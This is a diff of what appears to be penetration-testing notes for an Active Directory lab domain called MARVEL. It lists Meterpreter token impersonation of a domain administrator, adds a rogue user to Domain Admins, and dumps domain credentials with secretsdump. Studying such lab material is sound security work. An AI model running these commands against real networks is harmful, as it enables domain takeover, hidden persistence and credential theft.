@@ -77,15 +77,19 @@ meterpreter > sysinfo
 meterpreter > shell
 C:\Windows > powershell -ep bypass
 
-meterpreter > load <Double Tabulator>
 meterpreter > load incognito
 meterpreter > list_tokens -u
-meterpreter > impersonate_token marvel\\administrator
+meterpreter > list_tokens -g
+meterpreter > impersonate_token MARVEL\\administrator
+
 meterpreter > shell
 meterpreter > whoami
 meterpreter > rev2self
 
+C:\Windows\system32>net user /add hawkeye Passw0rd1@ /domain
+C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
 
+$ secretdump.py MARVEL.local/Administrator:'Passw0rd1@'@10.0.0.225
 
 
 
